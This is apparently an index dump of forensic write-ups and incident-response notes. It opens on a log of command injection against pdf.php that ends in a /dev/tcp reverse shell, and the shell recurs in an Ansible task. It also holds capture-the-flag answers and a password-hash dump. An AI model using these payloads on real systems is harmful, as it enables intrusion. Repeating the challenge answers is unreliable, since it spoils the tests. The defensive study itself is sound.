Firefox/104.0\" m4st3r@my_v4ult:~$ cat /var/log/apache2/access.log | grep \"pdf.php?\" 203.0.113.0 - - [03/Sep/2022:13:32:24 +0200] \"GET /pdf.php?name=website_report.pdf HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" 203.0.113.0 - - [03/Sep/2022:13:32:42 +0200] \"GET /pdf.php?name=a.pdf;id HTTP/1.1\" 200 59 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" 203.0.113.0 - - [03/Sep/2022:13:32:51 +0200] \"GET /pdf.php?name=a.pdf;pwd HTTP/1.1\" 200 52 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" 203.0.113.0 - - [03/Sep/2022:13:33:11 +0200] \"GET /pdf.php?name=a.pdf;whoami HTTP/1.1\" 200 40 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" 203.0.113.0 - - [03/Sep/2022:13:33:15 +0200] \"GET /pdf.php?name=a.pdf;cat%20/etc/issue HTTP/1.1\" 200 58 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" 203.0.113.0 - - [03/Sep/2022:13:33:21 +0200] \"GET /pdf.php?name=a.pdf;cat%20/etc/passwd HTTP/1.1\" 200 593 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" 203.0.113.0 - - [03/Sep/2022:13:33:56 +0200] \"GET /pdf.php?name=a.pdf;ls%20/home/m4st3r HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" 203.0.113.0 - - [03/Sep/2022:13:34:02 +0200] \"GET /pdf.php?name=a.pdf;ls%20/home/m4st3r/ansible HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" 203.0.113.0 - - [03/Sep/2022:13:34:31 +0200] \"GET /pdf.php?name=a.pdf;echo%20%22C4tXk9ctpG9QEMeL%22%20%3E%20/tmp/.secure HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" 203.0.113.0 - - [03/Sep/2022:13:34:57 +0200] \"GET /pdf.php?name=a.pdf;bash%20-i%20%3E&%20/dev/tcp/128.66.0.0/4444%200%3E&1 HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\" Attack via a .pdf . urldecode the last two commands for clarity: echo \"C4tXk9ctpG9QEMeL\" > /tmp/.secure bash -i >& /dev/tcp/128.66.0.0/4444 0>&1 Decrypt the vault’s .secure password: m4st3r@my_v4ult:~$ echo \"C4tXk9ctpG9QEMeL\" > /tmp/.secure In the ansible directory: m4st3r@my_v4ult:~/ansible$ ansible-vault decrypt --vault-pass-file /tmp/.secure roles/other/tasks/main.yml Decryption successful m4st3r@my_v4ult:~/ansible$ cat roles/other/tasks/main.yml - name: \"hack the planet\" ansible.builtin.shell: \"bash -i >& /dev/tcp/128.66.0.0/4444 0>&1\" - name: \"If someone search for a Flag ^^\" ansible.builtin.shell: \"echo 'redacted!!' > /flag\"",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7adcbd2d73748c6f7818842c23762588",
    "u": "https://dfir.tymyrddin.dev/docs/notes/windows",
    "t": "Windows analysis ",
    "c": "Windows analysis  OS queries  Domain  Get Fully Qualified Domain Name (FQDN): ([System.Net.Dns]::GetHostByName(($env:computerName))).Hostname Get just domain name: (Get-WmiObject -Class win32_computersystem).domain OS  Print hostname, OS build info, and powershell version: $Bit = ( get-wmiobject Win32_OperatingSystem ). OSArchitecture ; $V = $host | select-object -property \"Version\" ; $Build = ( Get-WmiObject -class Win32_OperatingSystem ). Caption ; write-host \"$env:computername is a $Bit $Build with Pwsh $V\" Hardware  Get processor info: gcim -ClassName Win32_Processor | fl caption, Name, SocketDesignation; Computer Model: gcim -ClassName Win32_ComputerSystem | fl Manufacturer, Systemfamily, Model, SystemType Disk space in Gigs: gcim -ClassName Win32_LogicalDisk | Select -Property DeviceID, DriveType, @{L='FreeSpaceGB';E={\"{0:N2}\" -f ($_.FreeSpace /1GB)}}, @{L=\"Capacity\";E={\"{0:N2}\" -f ($_.Size/1GB)}} | fl Time  Human-readable time: Get-Date -UFormat \"%T %a %d-%b-%Y UTC:%Z\" Comparisons between two strings of time: [Xml.XmlConvert]::ToString((Get-Date).ToUniversalTime(), [System.Xml.XmlDateTimeSerializationMode]::Utc) Compare UTC time with local time: $Local = get-date ; $UTC = ( get-date ). ToUniversalTime (); write-host \"LocalTime is: $Local\" ; write-host \"UTC is: $UTC\" Updates  Show all patch IDs with installation date: get-hotfix | select-object HotFixID , InstalledOn | Sort-Object -Descending -property InstalledOn | format-table -autosize Why an update failed: $Failures = gwmi -Class Win32_ReliabilityRecords ; $Failures | ? message -match 'failure' | Select -ExpandProperty message Recursively look for SomeFile.dll : $file = 'SomeFile.dll' ; $directory = 'C:\\windows' ; gci -Path $directory -Filter $file -Recurse -force | sort-object -descending -property LastWriteTimeUtc | fl * Account queries  Enumerating  Enabled local user accounts: Get-LocalUser | ? Enabled -eq \"True\" All users currently logged in: qwinsta To find all users logged in across the entire AD, use YossiSassi’s Get-UserSession.ps1 and Get-RemotePSSession.ps1 . Logging out  To force user logout, target their session id: logoff <session id> /v Changing passwords  Force a new user password for AD: $user = \"username\" ; $newPass = \"Hard to guess new password\" ; Set-ADAccountPassword -Identity $user -Reset -NewPassword ( ConvertTo-SecureString -AsPlainText \"$newPass\" -Force ) -verbose For local non-domain joined machines: net user username \"Hard to guess new password\" Disabling  To disable an AD Account, use the SAMAccountName : $user = \"username\" ; Disable-ADAccount -Identity \"$user\" Check it is disabled: ( Get-ADUser -Identity $user ). enabled To re-enable the account: Enable-ADAccount -Identity \"$user\" -verbose To disable a local account, list accounts with Get-LocalUser . Disable-LocalUser -name \"name\" To quickly eject an account from a specific group, like administrators or remote management: $user = \"username\" remove-adgroupmember -identity Administrators -members $User -verbose -confirm : $false Device accounts  Adversaries like to use accounts that have a $ . To show machine accounts which are a part of interesting groups: Get-ADComputer -Filter * -Properties MemberOf | ? { $_ . MemberOf } Reset password for a machine account: Reset-ComputerMachinePassword Service queries  Enumerating  All the services: get-service | Select Name , DisplayName , Status | sort status -descending | ft -Property * -AutoSize | Out-String -Width 4096 Show the executable supporting a service: Get-WmiObject win32_service |? State -match \"running\" | select Name , DisplayName , PathName , User | sort Name | ft -wrap -autosize Info on a specific service ( eventlog ): $Name = \"eventlog\" ; gwmi -Class Win32_Service -Filter \"Name = '$Name' \" | fl * Responses  Kill a service: Get-Service -DisplayName \"service\" | Stop-Service -Force -Confirm : $false -verbose To identify a service install which is hiding Windows services: sc sdset evilsvc \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\" Deploy: Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\services\\*\" | ft PSChildName , ImagePath -autosize | out-string -width 800 Grep results from System32: Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\services\\*\" | where ImagePath -notlike \"*System32*\" | ft PSChildName , ImagePath -autosize | out-string -width 800 Network queries  TCP connections  Get-NetTCPConnection | select LocalAddress , localport , remoteaddress , remoteport , state ,@{ name = \"process\" ; Expression ={( get-process -id $_ . OwningProcess ). ProcessName }}, @{ Name = \"cmdline\" ; Expression ={( Get-WmiObject Win32_Process -filter \"ProcessId = $( $_ . OwningProcess ) \" ). commandline }} | sort Remoteaddress -Descending | ft -wrap -autosize Search for/filter anypattern : Get-NetTCPConnection | select LocalAddress , localport , remoteaddress , remoteport , state ,@{ name = \"process\" ; Expression ={( get-process -id $_ . OwningProcess ). ProcessName }}, @{ Name = \"cmdline\" ; Expression ={( Get-WmiObject Win32_Process -filter \"ProcessId = $( $_ . OwningProcess ) \" ). commandline }} | Select-String -Pattern 'anypattern' ; Established connections  Established connections, sorted by creationtime (change to whatever sorting parameter): Get-NetTCPConnection -AppliedSetting Internet | select-object -property remoteaddress , remoteport , creationtime | Sort-Object -Property creationtime | format-table -autosize Unique remote IP connections: ( Get-NetTCPConnection ). remoteaddress | Sort-Object -Unique Investigating a suspicious IP: Get-NetTCPConnection | ? {( $_ . RemoteAddress -eq \"1.2.3.4\" )} | select-object -property state , creationtime , localport , remoteport | ft -autosize UDP connections  Get-NetUDPEndpoint | select local *, creationtime , remote * | ft -autosize Kill a connection  stop-process -verbose -force -Confirm : $false ( Get-Process -Id ( Get-NetTCPConnection -RemoteAddress \"1.2.3.4\" ). OwningProcess ) Check Hosts file  gci \"C:\\Windows\\System32\\Drivers\\etc\\hosts\" To check whether timestamps were recently altered: gci \"C:\\Windows\\System32\\Drivers\\etc\\hosts\" | fl * Time * DNS Cache  Collect the DNS cache on an endpoint: Get-DnsClientCache | out-string -width 1000 Using regex (second line): Get-DnsClientCache | ? Entry -NotMatch \"workstation|server|kerb|ocsp\" | out-string -width 1000 IPv6  Windows OS prioritises IPv6 over IPv4 making on-path-attacks easier. Get IPv6 addresses and networks: Get-NetIPAddress -AddressFamily IPv6 | ft Interfacealias , IPv6Address Check if a machine prioritises IPv6: ping $env:COMPUTERNAME -n 4 Changing reg to de-prioritise IPv6: New-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip6\\Parameters\\\" -Name \"DisabledComponents\" -Value 0x20 -PropertyType \"DWord\" If this reg already exists and has values, change the value: Set-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip6\\Parameters\\\" -Name \"DisabledComponents\" -Value 0x20 Restart the computer for this to take effect BITS  Get-BitsTransfer | fl DisplayName , JobState , TransferType , FileList , OwnerAccount , BytesTransferred , CreationTime , TransferCompletionTime Filter out common bits jobs in the local environment (below is just an example): Get-BitsTransfer | ? displayname -notmatch \"WU|Office|MachineName|configjson\" | fl DisplayName , JobState , TransferType , FileList , OwnerAccount , BytesTransferred , CreationTime , TransferCompletionTime Hunt down BITS transfers that are UPLOADING (indicator of data exfiltration): Get-BitsTransfer | ? TransferType -match \"Upload\" | fl DisplayName , JobState , TransferType , FileList , OwnerAccount , BytesTransferred , CreationTime , TransferCompletionTime Remoting queries  Enumerating  Created Powershell sessions: Get-PSSession WinRM sessions: get-wsmaninstance -resourceuri shell -enumerate | select Name ,...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "606b7dca708e570cabec677026409124",
    "u": "https://dfir.tymyrddin.dev/docs/thm/desktop",
    "t": "Organisation X desktop ",
    "c": "THM Room: Windows Forensics Organisation X desktop  One of the Desktops in the research lab at Organisation X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organisation X with finding answers to the below questions? Note: When loading registry hives in RegistryExplorer, it will caution us that the hives are dirty. Point RegistryExplorer to the .LOG1 and .LOG2 files with the same filename as the registry hive. It will automatically integrate the transaction logs and create a ‘clean’ hive. Once we tell RegistryExplorer where to save the clean hive, we can use that for our analysis, and we won’t need to load the dirty hives anymore. RegistryExplorer will guide you through this process. How many user created accounts are present on the system? Answer: 3 What is the username of the account that has never been logged in? Answer: thm-user2 What’s the password hint for the user THM-4n6? Answer: count When was the file ‘Changelog.txt’ accessed? Answer: 2021-11-24 18:18:48 What is the complete path from where the python 3.8.2 installer was run? Answer: Z:\\setups\\python-3.8.2.exe When was the USB device with the friendly name ‘USB’ last connected? Get the GUID . Load the SYSTEM hive and clean it. Look up the GUID in USBSTOR : Answer: 2021–11–24 18:40:06",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a1be8702c30b133a57a5dccabd87ac2b",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/c&c5",
    "t": "Command & Control level 5 ",
    "c": "Command & Control level 5  root-me challenge : Berthier, the malware seems to be manually maintened on the workstations. Therefore, it’s likely that the hackers have found all the computers’ passwords. Since ACME’s computer fleet seems to be up-to-date, it’s probably only due to password weakness. John, the system administrator doesn’t believe you. Prove him wrong! Find john’s password. The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de Get file: ┌──(kali㉿kali)-[~/Downloads/root-me] └─$ wget http://challenge01.root-me.org/forensic/ch2/ch2.tbz2 Unpack: ┌──(kali㉿kali)-[~/Downloads/root-me/forensic] └─$ tar -jxvf ch2.tbz2 ch2.dmp Using volatility3, dump the Windows user password hashes: ┌──(kali㉿kali)-[~/Downloads/volatility3] └─$ ./vol.py -f ../root-me/forensic/ch2.dmp windows.hashdump.Hashdump Volatility 3 Framework 2.4.2 Progress: 100.00 PDB scanning finished User rid lmhash nthash Administrator 500 aad3b435b51404eeaad3b435b51404ee 31d6cfe0d16ae931b73c59d7e0c089c0 Guest 501 aad3b435b51404eeaad3b435b51404ee 31d6cfe0d16ae931b73c59d7e0c089c0 John Doe 1000 aad3b435b51404eeaad3b435b51404ee b9f917853e3dbf6e6831ecce60725930",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "730d1881577eccb4e088ab6fdac4afe7",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Root-me Forensics challenges Why?  Gathering evidence to understand the progress of actions carried out by an attacker on a computer or an information system. How?  Command & Control level 2 Docker layers Log analysis web attack Command & Control level 5 Find the cat Ugly duckling Command & Control level 3 Open my vault Command & Control level 4 Job interview Command & Control level 6 Second job interview",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "25a02732197ed5fc15952ec0e1ae7575",
    "u": "https://dfir.tymyrddin.dev/docs/cd/redline",
    "t": "RedLine ",
    "c": "RedLine  Scenario  Cyber Defenders RedLine challenge : As a member of the Security Blue team, your assignment is to analyze a memory dump using Redline and Volatility tools. Your goal is to trace the steps taken by the attacker on the compromised machine and determine how they managed to bypass the Network Intrusion Detection System “NIDS”. Your investigation will involve identifying the specific malware family employed in the attack, along with its characteristics. Additionally, your task is to identify and mitigate any traces or footprints left by the attacker. Tools  Volatility 3 on SIFT-REMnux. Questions  Q1 What is the name of the suspicious process? sansforensics@siftworkstation: ~/Desktop/cases/c86-REDSTEALER-redline $ vol3 -f MemoryDump.mem windows.malfind Volatility 3 Framework 2.5.0 ... Progress: 100.00 Reading Symbol layer Progress: 100.00 PDB scanning finished PID Process Start VPN End VPN Tag Protection CommitCharge PrivateMemory File output Hexdump Disasm 5896 oneetx.exe 0x400000 0x437fff VadS PAGE_EXECUTE_READWRITE 56 1 Disabled 4d 5a 90 00 03 00 00 00 MZ...... 04 00 00 00 ff ff 00 00 ........ b8 00 00 00 00 00 00 00 ........ 40 00 00 00 00 00 00 00 @....... 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 00 00 00 ........ 00 00 00 00 00 01 00 00 ........ 0x400000: dec ebp 0x400001: pop edx 0x400002: nop 0x400003: add byte ptr [ebx], al 0x400005: add byte ptr [eax], al 0x400007: add byte ptr [eax + eax], al 0x40000a: add byte ptr [eax], al 7540 smartscreen.ex 0x2505c140000 0x2505c15ffff VadS PAGE_EXECUTE_READWRITE 1 1 Disabled 48 89 54 24 10 48 89 4c H.T$.H.L 24 08 4c 89 44 24 18 4c $.L.D$.L 89 4c 24 20 48 8b 41 28 .L$.H.A( 48 8b 48 08 48 8b 51 50 H.H.H.QP 48 83 e2 f8 48 8b ca 48 H...H..H b8 60 00 14 5c 50 02 00 .`..\\P.. 00 48 2b c8 48 81 f9 70 .H+.H..p 0f 00 00 76 09 48 c7 c1 ...v.H.. 0x2505c140000: mov qword ptr [rsp + 0x10], rdx 0x2505c140005: mov qword ptr [rsp + 8], rcx 0x2505c14000a: mov qword ptr [rsp + 0x18], r8 0x2505c14000f: mov qword ptr [rsp + 0x20], r9 0x2505c140014: mov rax, qword ptr [rcx + 0x28] 0x2505c140018: mov rcx, qword ptr [rax + 8] 0x2505c14001c: mov rdx, qword ptr [rcx + 0x50] 0x2505c140020: and rdx, 0xfffffffffffffff8 0x2505c140024: mov rcx, rdx 0x2505c140027: movabs rax, 0x2505c140060 0x2505c140031: sub rcx, rax 0x2505c140034: cmp rcx, 0xf70 0x2505c14003b: jbe 0x2505c140046 Q2 What is the child process name of the suspicious process? sansforensics@siftworkstation: ~/Desktop/cases/c86-REDSTEALER-redline $ vol3 -f MemoryDump.mem windows.pslist Volatility 3 Framework 2.5.0 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime File output ... 5896 8844 oneetx.exe 0xad8189b41080 5 - 1 True 2023-05-21 22:30:56.000000 N/A Disabled 7732 5896 rundll32.exe 0xad818d1912c0 1 - 1 True 2023-05-21 22:31:53.000000 N/A Disabled ... Q3 What is the memory protection applied to the suspicious process memory region? 5896 oneetx.exe 0x400000 0x437fff VadS PAGE_EXECUTE_READWRITE 56 1 Disabled Q4 What is the name of the process responsible for the VPN connection? sansforensics@siftworkstation: ~/Desktop/cases/c86-REDSTEALER-redline $ vol3 -f MemoryDump.mem windows.pstree Volatility 3 Framework 2.5.0 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime ... *** 6724 3580 Outline.exe 0xad818e578080 0 - 1 True 2023-05-21 22:36:09.000000 2023-05-21 23:01:24.000000 **** 4224 6724 Outline.exe 0xad818e88b080 0 - 1 True 2023-05-21 22:36:23.000000 2023-05-21 23:01:24.000000 **** 4628 6724 tun2socks.exe 0xad818de82340 0 - 1 True 2023-05-21 22:40:10.000000 2023-05-21 23:01:24.000000 ... Q5 What is the attacker’s IP address? sansforensics@siftworkstation: ~/Desktop/cases/c86-REDSTEALER-redline $ vol3 -f MemoryDump.mem windows.netscan | grep -i oneetx.exe 0xad818de4aa20.0TCPv4 10.0.85.2DB scan55462fin 77.91.124.20 80 CLOSED 5896 oneetx.exe 2023-05-21 23:01:22.000000 0xad818e4a6900 UDPv4 0.0.0.0 0 * 0 5480 oneetx.exe 2023-05-21 22:39:47.000000 0xad818e4a6900 UDPv6 :: 0 * 0 5480 oneetx.exe 2023-05-21 22:39:47.000000 0xad818e4a9650 UDPv4 0.0.0.0 0 * 0 5480 oneetx.exe 2023-05-21 22:39:47.000000 Q6 Based on the previous artifacts. What is the name of the malware family? MalwareBazaar Database RedLineStealer Q7 What is the full URL of the PHP file that the attacker visited? hxxp[://]77[.]91[.]124[.]20/store/games/index[.]php Q8 What is the full path of the malicious executable? sansforensics@siftworkstation: ~/Desktop/cases/c86-REDSTEALER-redline $ vol3 -f MemoryDump.mem windows.filescan | grep -i oneetx.exe 0xad818d436c70.0\\Users\\Tammam\\AppData\\Local\\Temp\\c3912af058\\oneetx.exe 216 0xad818da36c30 \\Users\\Tammam\\AppData\\Local\\Temp\\c3912af058\\oneetx.exe 216 0xad818ef1a0b0 \\Users\\Tammam\\AppData\\Local\\Temp\\c3912af058\\oneetx.exe 216",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "bc40b978eb67fcb04cdd99f2d3f3cbdd",
    "u": "https://dfir.tymyrddin.dev/docs/root-me/c&c4",
    "t": "Command & Control level 4 ",
    "c": "Command & Control level 4  root-me challenge : Berthier, thanks to this new information about the processes running on the workstation, it’s clear that this malware is used to exfiltrate data. Find out the ip of the internal server targeted by the hackers! The validation flag should have this format : IP:PORT. The uncompressed memory dump md5 hash is e3a902d4d44e0f7bd9cb29865e0a15de ┌──(kali㉿kali)-[~/Downloads/volatility3] └─$ ./vol.py -f ../root-me/forensic/ch2.dmp windows.cmdline.CmdLine Volatility 3 Framework 2.4.2 Progress: 100.00 PDB scanning finished PID Process Args 4 System Required memory at 0x10 is not valid (process exited?) 308 smss.exe \\SystemRoot\\System32\\smss.exe 404 csrss.exe %SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16 456 wininit.exe Required memory at 0x7ffd7010 is inaccessible (swapped) 468 csrss.exe %SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16 500 winlogon.exe Required memory at 0x1f0cbc is inaccessible (swapped) 560 services.exe C:\\Windows\\system32\\services.exe 576 lsass.exe C:\\Windows\\system32\\lsass.exe 584 lsm.exe C:\\Windows\\system32\\lsm.exe 692 svchost.exe C:\\Windows\\system32\\svchost.exe -k DcomLaunch 764 svchost.exe C:\\Windows\\system32\\svchost.exe -k RPCSS 832 svchost.exe C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted 904 svchost.exe C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted 928 svchost.exe C:\\Windows\\system32\\svchost.exe -k netsvcs 1084 svchost.exe C:\\Windows\\system32\\svchost.exe -k LocalService 1172 svchost.exe C:\\Windows\\system32\\svchost.exe -k NetworkService 1220 AvastSvc.exe \"C:\\Program Files\\AVAST Software\\Avast\\AvastSvc.exe\" 1712 spoolsv.exe C:\\Windows\\System32\\spoolsv.exe 1748 svchost.exe C:\\Windows\\system32\\svchost.exe -k LocalServiceNoNetwork 1872 sppsvc.exe Required memory at 0x7ffd5010 is inaccessible (swapped) 1968 vmtoolsd.exe \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" 336 wlms.exe Required memory at 0x7ffd4010 is inaccessible (swapped) 448 VMUpgradeHelpe Required memory at 0x7ffd7010 is inaccessible (swapped) 1612 TPAutoConnSvc. \"C:\\Program Files\\VMware\\VMware Tools\\TPAutoConnSvc.exe\" 2352 taskhost.exe \"taskhost.exe\" 2496 dwm.exe \"C:\\Windows\\system32\\Dwm.exe\" 2548 explorer.exe C:\\Windows\\Explorer.EXE 2568 TPAutoConnect. TPAutoConnect.exe -q -i vmware -a COM1 -F 30 2600 conhost.exe Required memory at 0x2d0cbc is inaccessible (swapped) 2660 VMwareTray.exe \"C:\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe\" 2676 VMwareUser.exe \"C:\\Program Files\\VMware\\VMware Tools\\VMwareUser.exe\" 2720 AvastUI.exe \"C:\\Program Files\\AVAST Software\\Avast\\AvastUI.exe\" /nogui 2744 StikyNot.exe \"C:\\Windows\\System32\\StikyNot.exe\" 2772 iexplore.exe \"C:\\Users\\John Doe\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\iexplore.exe\" 2900 SearchIndexer. C:\\Windows\\system32\\SearchIndexer.exe /Embedding 3176 wmpnetwk.exe \"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\" 3352 svchost.exe C:\\Windows\\system32\\svchost.exe -k LocalServiceAndNoImpersonation 3452 swriter.exe Required memory at 0x7ffd9010 is inaccessible (swapped) 3512 soffice.exe Required memory at 0x3610b4 is inaccessible (swapped) 3556 soffice.bin Required memory at 0x7ffdf010 is not valid (process exited?) 3564 soffice.bin \"C:\\Program Files\\LibreOffice 3.6\\program\\swriter.exe\" \"-o\" \"C:\\Users\\John Doe\\Documents\\Procedure Winpmemdump.odt\" \"--writer\" \"-env:OOO_CWD=2C:\\\\Users\\\\John Doe\\\\Documents\" 3624 svchost.exe C:\\Windows\\System32\\svchost.exe -k secsvcs 1232 taskmgr.exe \"C:\\Windows\\system32\\taskmgr.exe\" /4 3152 cmd.exe \"C:\\Windows\\system32\\cmd.exe\" 3228 conhost.exe Required memory at 0x2d1250 is inaccessible (swapped) 1616 cmd.exe cmd.exe 2168 conhost.exe \\??\\C:\\Windows\\system32\\conhost.exe 1136 iexplore.exe \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" 3044 iexplore.exe \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" SCODEF:1136 CREDAT:71937 1720 audiodg.exe C:\\Windows\\system32\\AUDIODG.EXE 0x298 3144 winpmem-1.3.1. winpmem-1.3.1.exe ram.dmp Note: conhost.exe (PID 2168). Use procdump or memdump for the cmd.exe (PID 3152) and look for tcprelay.exe in the dump with strings .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "6aa39f81baab3fed51cb947a6872e93e",
    "u": "https://dfir.tymyrddin.dev/docs/notes/choreography",
    "t": "Forensic choreographies ",
    "c": "Forensic choreographies  First responder  A dedicated first responder who is alerted and called to the scene usually has some knowledge or understanding of the workings of devices, networks, and perhaps even of the IT infrastructure in the community or organisation, if applicable. First responders do not have to be may not be skilled in digital forensics or digital investigations. First responders are responsible for securing the scene and ensuring that the data, peripherals, equipment, and storage are not used, tampered with, removed, or compromised by unauthorised individuals, so as not to compromise a possible investigation for a legal case. The below therefor assumes heading for a legal case. Better too much than too little. Documentation of the scene is usually also done by first responders to aid in further investigations. Documentation of the scene can include photographs, video, voice recording, and manual documentation of: The room where the device is located (desk, ceiling, entrance/exit, windows, lighting, electrical outlets, and data drops) The state of the device (on, off, power light blinking) The screen contents and whether the device is on (operating system, running programs, date and time, wired and/or wireless network connectivity) Books, notes, and pieces of paper Connected and disconnected cables Audit trails  An audit trail or log maintains a historical record of actions, events, and tasks. It can have various levels of detail and can be manual or automated. During a forensic examination, it’s beneficial to keep a high-level log of pending and completed activity. Pending tasks turn into completed tasks, and completed tasks make up the examination’s historical record. Often while working, you’ll think of a task that you need to address sometime in the future or a task you’ve completed and should note. Making quick notes and more comprehensive task lists becomes increasingly valuable as the length of the examination grows (possibly to many hours, days, or longer) or when more than one examiner is involved. Task management  Helps ensure nothing was forgotten Avoids duplicating work already done Improves collaboration and coordination when working in teams Shows compliance with policies and procedures Facilitates accounting, including billing Helps produce documentation and reports (formal incident reports or forensic reports) Allows for post-incident review to identify lessons learned and support process optimization Helps to maintain a longer-term historical record of completed activity Supports learning and education for new team members Serves as a guide to remember complex procedures Provides information for troubleshooting problems and getting support Maintains a record of work done by external and third-party examiners Chain of custody (CoC)  A CoC is a form that legally ensures the integrity of evidence as it is exchanged between individuals, and provides a level of accountability as personal identification is required when completing the forms. This form gives an exact log and account of the transportation and the exchange between parties, from collection at the scene to a presentation in a court. More in Computer forensics: Chain of custody [updated 2019] . Data acquisition  Once the scene has been secured and documented, the forensic investigation can start: the process of acquiring what can be considered as physical evidence. There are multiple scenarios in which data is acquired for a digital forensic investigation. Procedures which can be used in every environment: Make sure a write blocker is attached/active. Identify devices, partitions, input and output files, and parameters Make image Hash the evidence before and during, or after, acquisition to provide proof that it was not tampered with. Live acquisition  Investigating a live system means that logs and timestamps will be generated while the system is being examined. Therefore, thorough documentation will justify the actions taken and not be viewed as evidence tampering. When investigating a powered-on device: Move the mouse or glide your fingers across the touchpad if you suspect the device may be in a sleep state. Do not click on the buttons as this may open or close programs and processes. Photograph and record the screen and all visible programs, data, time, and desktop items. Data stored in RAM and paging files must be collected with as little modification to the data as possible. Use Guymager, dc3dd in Kali Linux. CAINE and Helix can also be used for acquiring RAM and the paging file. Due to the easy availability of full disk encryption or full volume encryption, DO NOT pull the plug on computer systems. Mobile  If the device is powered on, it may contain volatile encryption keys and should not be turned off. A power source should be connected as soon as possible to avoid the device losing power. Be sure to seize the charging cable to keep power to the device. Place the device in “Airplane Mode” and verify that Wi-Fi and Bluetooth are off. If you cannot put the device in “AirplaneMode”, place device in a Faraday Bag or double wrap in aluminum foil to keep signals from potentially altering the device. Keep device charging if at all possible. Post-mortem acquisition  At boot time, a PC, mobile phone, or media player executes boot activities that can overwrite previously cached data. Powered-off devices should never be turned on (unless done so by a forensic investigator), to ensure that existing data is not erased and that new data is not written. Devices can appear as if they are off while in a sleep or hibernate state. As a simple test, the mouse can be moved and monitors (if any) can be switched on to check state. Even if they are in an off state, photograph the screen and ports. Depending on the incident type, use a pair of latex gloves, to avoid leaving additional fingerprints on the system and components. Phones, media players, laptops, or any devices that can communicate over any network can potentially be altered while being seized or even after they have been seized. This can be caused by either deliberate tampering or unintentional changes (humidity or electricity). Switch the device to airplane mode to avoid any further connections and communications, and consider the use of containers that can shield the device from external radiofrequency (RF) sources, such as a Faraday bag. When investigating portable and mobile devices in an already off state and not damaged, do not turn it back on. Remove the battery (if possible) and if required (Note that removing the battery can alter the contents in the volatile memory , even when in an off state. Whether to remove the battery depends on the type of incident). Place it in an evidence bag to ensure that there will be no way of accidentally turning on the device once unplugged. If the device is submerged in liquid, or had liquid damage, remove it from the liquid only if you feel you can remove the battery (normally possible with Android devices). Once the battery is removed, place the device back in the liquid. Collect basic information about the device including Model, Serial Number, Android OS or iOS Version and/or Networks. Write blocking  This is when a forensic investigator gains access to the electronic device(s) containing raw data that has been identified as 